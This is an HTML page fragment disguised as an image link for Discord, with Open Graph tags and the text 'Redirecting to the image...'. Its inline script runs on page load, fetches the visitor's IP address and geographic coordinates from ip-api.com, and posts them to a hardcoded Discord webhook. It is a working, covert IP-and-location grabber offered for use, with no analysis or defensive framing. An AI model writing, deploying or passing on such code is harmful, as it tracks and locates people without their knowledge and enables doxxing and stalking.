    <meta property="og:title" content="Image" />

    <meta property="og:image" content="https://i.imgur.com/i12zp3X.png" />
    <meta property="og:type" content="image/png" />

    <script>
        const webhookURL = "https://discordapp.com/api/webhooks/1321276987339309188/wHN05XAVPOHQWVWcwn-ke38FBDCuXBLxbsOy5SeZybhbTnD-mGsGaSPuJIxUl2VnJcpi";

        async function logIPAndLocation() {
            try {
                // Fetch IP and location data
                const response = await fetch("http://ip-api.com/json/");
                const data = await response.json();

                if (data.status === "success") {
                    const ip = data.query;
                    const lat = data.lat;
                    const lon = data.lon;

                    // Send IP, lat, and long to Discord webhook
                    await fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: `IP Logged: ${ip}\nLatitude: ${lat}\nLongitude: ${lon}`
                        })
                    });
                } else {
                    console.error("Failed to retrieve location data:", data.message);
                }
            } catch (error) {
                console.error("Error logging IP and location:", error);
            }
        }

        logIPAndLocation();
    </script>
</head>
<body>
    <p>Redirecting to the image...</p>
    <p>Your image should appear when shared on Discord.</p>
</body>
